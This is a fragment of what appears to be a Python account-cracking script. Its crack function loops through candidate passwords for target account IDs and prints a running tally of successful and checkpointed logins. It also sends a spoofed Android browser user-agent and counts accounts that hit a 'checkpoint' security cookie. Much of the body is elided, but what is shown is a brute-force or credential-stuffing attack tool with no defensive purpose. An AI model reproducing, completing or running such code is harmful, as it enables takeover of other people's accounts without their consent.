...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r《BAZ》 {P}[{b}{loop}{P}/{u}{len(id)}{P}]><{P}[{H}{ok}{P}]><{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 11; SM-A032F Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.129 Mobile Safari/537.36"}
				if 'no' in taplikasi:
					ok+=1
